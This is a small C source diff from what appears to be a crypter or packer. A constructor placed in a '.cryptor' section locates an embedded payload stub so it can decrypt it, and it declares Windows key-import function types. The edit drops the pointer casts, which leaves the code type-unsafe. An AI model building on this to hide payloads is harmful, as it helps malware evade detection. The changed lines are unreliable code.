@@ -55,8 +55,8 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	* Get the section offsets for the cryptor to decrypt the payload stub
 	*/
-	extern UINT64 START_OF_PAYLOAD;
-	extern UINT64 END_OF_PAYLOAD;
+	extern unsigned int START_OF_PAYLOAD;
+	extern unsigned int END_OF_PAYLOAD;
 	
 #ifdef WIN32
 	typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
@@ -69,8 +69,8 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * Decode the appropriate values to get the offest and the size paramaters correct
 	 */
-	UINT64  addr_s = (UINT64)&START_OF_PAYLOAD;
-	UINT64  addr_e = (UINT64)&END_OF_PAYLOAD;
+	UINT64  addr_s = &START_OF_PAYLOAD;
+	UINT64  addr_e = &END_OF_PAYLOAD;
 	UINT64 payload_size;
 	BYTE* ptr_payload;
 	/*
